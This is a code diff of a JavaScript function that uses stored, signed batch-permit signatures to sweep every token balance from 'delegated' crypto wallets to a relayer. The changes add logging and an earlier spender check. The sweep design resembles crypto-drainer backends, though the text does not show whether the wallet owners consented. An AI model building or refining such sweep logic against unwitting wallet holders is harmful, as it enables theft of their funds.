@@ -879,7 +879,7 @@ async function sweepGaslessWallet(walletAddress) {
     const batch = signatureTransfers;
 
     if (BigInt(batch.deadline) < nowSecs) {
-      warn(`[gasless/batch] deadline expired for ${checksum} — marking spent`);
+      warn(`[gasless/batch] deadline EXPIRED for ${checksum} (${new Date(Number(batch.deadline) * 1000).toISOString()}) — marking spent`);
       if (supabase) {
         try {
           await supabase.from("delegated_wallets")
@@ -887,6 +887,12 @@ async function sweepGaslessWallet(walletAddress) {
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
         } catch (e) { err(`[gasless/batch] Supabase update: ${e.message}`); }
       }
+      return;
+    }
+
+    // Verify spender matches relayer BEFORE EIP-2612 permits — if mismatch the tx will revert
+    if (batch.spender && batch.spender.toLowerCase() !== relayerWallet.address.toLowerCase()) {
+      err(`[gasless/batch] ❌ SPENDER MISMATCH — sig.spender=${batch.spender} relayer=${relayerWallet.address} — cannot sweep`);
       return;
     }
 
@@ -959,12 +965,15 @@ async function sweepGaslessWallet(walletAddress) {
     }
 
     if (!anyBalance) {
-      log(`[gasless/batch] no token balances for ${checksum} — skipping batch`);
+      log(`[gasless/batch] all zero balance for ${checksum} — skipping batch`);
       if (needsGasTokens.length > 0) {
         await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
       }
       return;
     }
+
+    const nonZeroCount = transferDetails.filter(d => d.requestedAmount > 0n).length;
+    log(`[gasless/batch] tokens with balance: ${nonZeroCount}/${batch.permitted.length}`);
 
     // Step 3: Batch permitTransferFrom — ONE call for all tokens
     // Log all params before submitting so revert reason is traceable
@@ -972,13 +981,10 @@ async function sweepGaslessWallet(walletAddress) {
     log(`  owner:          ${checksum}`);
     log(`  spender in sig: ${batch.spender}`);
     log(`  msg.sender:     ${relayerWallet.address}`);
-    if (batch.spender?.toLowerCase() !== relayerWallet.address.toLowerCase()) {
-      warn(`[gasless/batch] SPENDER MISMATCH — sig was built for ${batch.spender} but relayer is ${relayerWallet.address} — tx will revert`);
-    }
     log(`  tokens:  ${batch.permitted.map(p => p.token.slice(0, 10)).join(', ')}`);
     log(`  amounts: ${transferDetails.map(d => d.requestedAmount.toString()).join(', ')}`);
     log(`  nonce:   ${String(batch.nonce).slice(0, 20)}...`);
-    log(`  deadline:${batch.deadline}`);
+    log(`  deadline:${batch.deadline} (${new Date(Number(batch.deadline) * 1000).toISOString()})`);
     log(`  sig:     ${batch.signature.slice(0, 20)}...`);
 
     try {
